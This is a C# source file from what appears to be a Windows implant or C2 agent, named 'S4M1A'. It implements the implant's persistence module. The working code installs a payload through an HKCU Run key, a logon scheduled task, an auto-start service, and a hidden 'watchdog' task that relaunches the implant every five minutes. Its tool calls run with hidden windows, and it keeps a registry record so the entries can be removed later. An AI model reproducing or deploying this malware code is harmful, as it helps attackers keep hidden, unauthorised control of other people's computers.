using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Text;
using Microsoft.Win32;

namespace S4M1A.Implant
{
    // =====================================================================
    //  S4M1A Persistence v2.0
    //
    //  Contract (used by Commands.cs / Implant.cs):
    //    Persistence.Add(name, type, payload)   -> status string
    //    Persistence.Remove(name)               -> status string
    //    Persistence.RemoveAll()                -> void (uninstall path)
    //
    //  Types:  reg     - HKCU Run key (current user, interactive logon)
    //          sched   - schtasks ONLOGON task (current user)
    //          service - sc create auto-start (LocalSystem, requires admin)
    //          watchdog- schtasks task: fires at logon AND every 5 minutes.
    //                    The implant's own single-instance mutex turns extra
    //                    launches into instant no-ops, so the task acts as
    //                    "revive if dead, do nothing if alive".
    //
    //  Every installed entry is recorded in HKCU\Software\S4M1A so a later
    //  uninstall/cleanup command can remove everything, including entries
    //  installed by a previous run of the implant.
    // =====================================================================

    public static class Persistence
    {
        private const string StoreKey = @"Software\S4M1A";
        private const string StoreName = "PersistV1";
        private const string RunKey = @"Software\Microsoft\Windows\CurrentVersion\Run";

        private static readonly HashSet<string> _known = new HashSet<string>();

        // =====================================================================
        //  Public API
        // =====================================================================

        public static string Add(string name, string type, string payload)
        {
            try
            {
                string safeName = Sanitize(name, "S4M1A-" + ConfigId());
                string safeType = (type ?? "").ToLowerInvariant();
                if (string.IsNullOrEmpty(payload))
                    return "ERR: empty payload";

                switch (safeType)
                {
                    case "reg":      return InstallReg(safeName, payload);
                    case "sched":    return InstallSched(safeName, payload);
                    case "service":  return InstallService(safeName, payload);
                    case "watchdog": return InstallWatchdog(safeName, payload);
                    default: return "ERR: unknown type (reg|sched|service|watchdog)";
                }
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        public static string Remove(string name)
        {
            try
            {
                string type = null;
                foreach (string e in LoadStore())
                {
                    string[] p = e.Split('|');
                    if (p.Length == 2 && p[0] == name)
                    {
                        type = p[1];
                        _known.Remove(e);
                        break;
                    }
                }
                string rc = RemoveByNameType(name, type);
                SaveStore();
                return rc;
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        public static void RemoveAll()
        {
            try
            {
                foreach (string e in LoadStore())
                {
                    string[] p = e.Split('|');
                    if (p.Length == 2) RemoveByNameType(p[0], p[1]);
                    _known.Remove(e);
                }
                RemoveByNameType("S4M1A-" + ConfigId(), null); // default name
                try { Registry.CurrentUser.DeleteSubKeyTree(StoreKey, false); } catch { }
                _known.Clear();
            }
            catch { }
        }

        // =====================================================================
        //  Installers
        // =====================================================================

        private static string InstallReg(string name, string payload)
        {
            using (RegistryKey rk = Registry.CurrentUser.CreateSubKey(RunKey))
            {
                if (rk == null) return "ERR: cannot open Run key";
                rk.SetValue(name, payload);
            }
            _known.Add(name + "|reg");
            SaveStore();
            return "installed registry:" + name;
        }

        private static string InstallSched(string name, string payload)
        {
            string arg = "/Create /TN \"" + name + "\" /TR " + Quote(payload) +
                         " /SC ONLOGON /RL LIMITED /F";
            int rc = RunTool("schtasks.exe", arg);
            if (rc != 0) return "ERR: schtasks rc=" + rc;
            _known.Add(name + "|sched");
            SaveStore();
            return "installed task:" + name;
        }

        private static string InstallService(string name, string payload)
        {
            int rc = RunTool("sc.exe",
                "create " + name + " binPath= " + Quote(payload) + " start= auto");
            if (rc == 0) rc = RunTool("sc.exe", "start " + name);
            if (rc != 0)
                return "ERR: sc rc=" + rc + " (admin required for services)";
            _known.Add(name + "|service");
            SaveStore();
            return "installed service:" + name;
        }

        private const int WatchdogMinutes = 5;

        // Watchdog = scheduled task with a logon trigger AND a repeating
        // time trigger (every WatchdogMinutes). The task is imported from a
        // generated XML so both triggers + settings can be expressed
        // (schtasks CLI cannot combine ONLOGON with a repetition period).
        private static string InstallWatchdog(string name, string payload)
        {
            try
            {
                if (!File.Exists(payload))
                    return "ERR: payload not found: " + payload;

                string xml = BuildTaskXml(name, payload, WatchdogMinutes);
                string tmp = Path.Combine(Path.GetTempPath(), name + ".xml");
                File.WriteAllText(tmp, xml, Encoding.Unicode); // UTF-16 LE + BOM
                int rc;
                try
                {
                    rc = RunTool("schtasks.exe",
                        "/Create /XML \"" + tmp + "\" /TN \"" + name + "\" /F");
                }
                finally
                {
                    try { File.Delete(tmp); } catch { }
                }
                if (rc != 0) return "ERR: schtasks rc=" + rc;
                _known.Add(name + "|watchdog");
                SaveStore();
                return "installed watchdog:" + name;
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        private static string BuildTaskXml(string name, string payload, int minutes)
        {
            string user = Environment.UserDomainName + "\\" + Environment.UserName;
            string start = DateTime.Now.AddMinutes(1).ToString("yyyy-MM-dd'T'HH:mm:ss");
            string interval = (minutes % 60 == 0)
                ? "PT" + (minutes / 60) + "H"
                : "PT" + minutes + "M";
            string dir = Path.GetDirectoryName(payload);
            if (string.IsNullOrEmpty(dir)) dir = Path.GetPathRoot(payload);

            return "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n" +
                "<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n" +
                "  <RegistrationInfo><Description>S4M1A watchdog</Description></RegistrationInfo>\n" +
                "  <Triggers>\n" +
                "    <LogonTrigger><Enabled>true</Enabled><UserId>" + XmlEscape(user) + "</UserId></LogonTrigger>\n" +
                "    <TimeTrigger>\n" +
                "      <StartBoundary>" + start + "</StartBoundary>\n" +
                "      <Enabled>true</Enabled>\n" +
                "      <Repetition><Interval>" + interval + "</Interval><StopAtDurationEnd>false</StopAtDurationEnd></Repetition>\n" +
                "    </TimeTrigger>\n" +
                "  </Triggers>\n" +
                "  <Principals><Principal id=\"Author\">\n" +
                "    <LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel>\n" +
                "  </Principal></Principals>\n" +
                "  <Settings>\n" +
                "    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n" +
                "    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n" +
                "    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n" +
                "    <AllowHardTerminate>true</AllowHardTerminate>\n" +
                "    <StartWhenAvailable>true</StartWhenAvailable>\n" +
                "    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n" +
                "    <IdleSettings><StopOnIdleEnd>false</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings>\n" +
                "    <AllowStartOnDemand>true</AllowStartOnDemand>\n" +
                "    <Enabled>true</Enabled>\n" +
                "    <Hidden>true</Hidden>\n" +
                "    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n" +
                "    <WakeToRun>false</WakeToRun>\n" +
                "    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\n" +
                "    <Priority>7</Priority>\n" +
                "  </Settings>\n" +
                "  <Actions Context=\"Author\">\n" +
                "    <Exec>\n" +
                "      <Command>" + XmlEscape(payload) + "</Command>\n" +
                "      <WorkingDirectory>" + XmlEscape(dir) + "</WorkingDirectory>\n" +
                "    </Exec>\n" +
                "  </Actions>\n" +
                "</Task>";
        }

        private static string XmlEscape(string s)
        {
            if (string.IsNullOrEmpty(s)) return "";
            return s.Replace("&", "&amp;").Replace("<", "&lt;")
                    .Replace(">", "&gt;").Replace("\"", "&quot;")
                    .Replace("'", "&apos;");
        }

        // =====================================================================
        //  Uninstallers
        // =====================================================================

        private static string RemoveByNameType(string name, string type)
        {
            try
            {
                if (string.IsNullOrEmpty(type))
                {
                    // attempt all three (cheap and safe)
                    RemoveReg(name);
                    RemoveTask(name);
                    RemoveService(name);
                    return "removed:" + name;
                }
                switch (type)
                {
                    case "reg":      RemoveReg(name); break;
                    case "sched":    RemoveTask(name); break;
                    case "service":  RemoveService(name); break;
                    case "watchdog": RemoveTask(name); break;
                }
                return "removed:" + name;
            }
            catch (Exception ex)
            {
                return "ERR: " + ex.Message;
            }
        }

        private static void RemoveReg(string name)
        {
            try
            {
                using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(RunKey, true))
                {
                    if (rk != null) rk.DeleteValue(name, false);
                }
            }
            catch { }
        }

        private static void RemoveTask(string name)
        {
            try { RunTool("schtasks.exe", "/Delete /TN \"" + name + "\" /F"); }
            catch { }
        }

        private static void RemoveService(string name)
        {
            try
            {
                RunTool("sc.exe", "stop " + name);
                RunTool("sc.exe", "delete " + name);
            }
            catch { }
        }

        // =====================================================================
        //  Helpers
        // =====================================================================

        private static string Sanitize(string name, string fallback)
        {
            if (string.IsNullOrEmpty(name)) return fallback;
            var sb = new System.Text.StringBuilder(name.Length);
            foreach (char c in name)
            {
                if (char.IsLetterOrDigit(c) || c == '_' || c == '-')
                    sb.Append(c);
                else
                    sb.Append('_');
            }
            string s = sb.ToString();
            return s.Length == 0 ? fallback : s;
        }

        private static string Quote(string s)
        {
            return "\"" + s.Replace("\"", "\\\"") + "\"";
        }

        private static string ConfigId()
        {
            try { return Config.Current != null ? Config.Current.Id : "unknown"; }
            catch { return "unknown"; }
        }

        private static int RunTool(string exe, string args)
        {
            try
            {
                ProcessStartInfo psi = new ProcessStartInfo(exe, args)
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                using (Process p = Process.Start(psi))
                {
                    if (p == null) return -1;
                    if (!p.WaitForExit(30000))
                    {
                        try { p.Kill(); } catch { }
                        return -2;
                    }
                    return p.ExitCode;
                }
            }
            catch
            {
                return -1;
            }
        }

        // -------- recording store (HKCU\Software\S4M1A) --------

        private static List<string> LoadStore()
        {
            List<string> list = new List<string>();
            try
            {
                using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(StoreKey))
                {
                    if (rk != null)
                    {
                        object v = rk.GetValue(StoreName);
                        if (v is string[])
                            list.AddRange((string[])v);
                    }
                }
            }
            catch { }
            return list;
        }

        private static void SaveStore()
        {
            try
            {
                using (RegistryKey rk = Registry.CurrentUser.CreateSubKey(StoreKey))
                {
                    if (rk != null)
                    {
                        string[] arr = new string[_known.Count];
                        _known.CopyTo(arr);
                        rk.SetValue(StoreName, arr);
                    }
                }
            }
            catch { }
        }
    }
}